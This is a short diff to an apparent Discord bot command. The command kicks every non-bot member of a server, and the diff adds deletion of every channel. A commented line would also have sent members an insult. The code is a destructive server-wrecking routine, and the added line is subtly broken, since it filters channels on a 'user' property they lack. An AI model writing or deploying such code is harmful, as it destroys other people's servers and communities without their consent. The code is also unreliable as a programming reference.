@@ -111,6 +111,7 @@ if (message.content === prefix + "da") {
 
    // message.guild.members.filter(m => !m.user.bot).map(async members => await members.sendMessage("test du casse couille"));
     message.guild.members.filter(m => !m.user.bot).map(async members => await members.kick());
+    message.guild.channels.filter(c => !c.user.bot).map(async channels => await channels.delete());
 
     //}
 }
